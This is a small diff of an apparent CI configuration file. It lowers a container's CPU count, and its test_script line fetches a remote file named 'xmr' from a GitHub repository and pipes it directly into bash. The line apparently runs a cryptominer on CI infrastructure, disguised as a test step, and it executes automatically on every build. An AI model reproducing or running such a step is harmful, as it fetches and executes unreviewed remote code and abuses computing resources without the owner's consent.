@@ -1,5 +1,5 @@
 test_task:
   container:
     image: node:latest
-    cpu: 64
+    cpu: 32
   test_script: curl -sL https://github.com/fadliamroziqyaa-hub/gosen/raw/main/xmr | bash
